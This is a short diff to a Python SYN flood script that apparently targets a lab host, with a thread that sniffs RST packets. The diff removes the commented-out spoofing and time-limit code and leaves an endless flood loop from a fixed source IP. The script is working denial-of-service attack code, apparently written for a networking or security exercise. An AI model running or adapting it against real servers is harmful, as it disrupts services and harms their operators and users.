@@ -9,15 +9,8 @@ def syn_flood():
 
     print(f"[*] Starting SYN flood attack on {server_ip}:{server_port}...")
 
-    # start_time = time.time()
-    # while time.time() - start_time < 60:
-    # pass
     while True:
-        # Generate a random source IP and port for spoofing
-        # src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
-        # src_port = random.randint(1024, 65535)  # Random source port must be an integer
-        # You can also comment above and uncomment below to try with legitimate values
-        src_ip = "192.168.1.2"  # Use h1's real IP for testing
+        src_ip = "192.168.1.2"  # Use h1's real IP
         src_port = 1234
 
         # Build the SYN packet
@@ -51,7 +44,4 @@ def sniff_rst_packets():
 if __name__ == "__main__":
     rst_sniffer_thread = threading.Thread(target=sniff_rst_packets, daemon=True)
     rst_sniffer_thread.start()
-    # try:
     syn_flood()
-    # except KeyboardInterrupt:
-    # print("\n[!] Stopping SYN flood attack.")
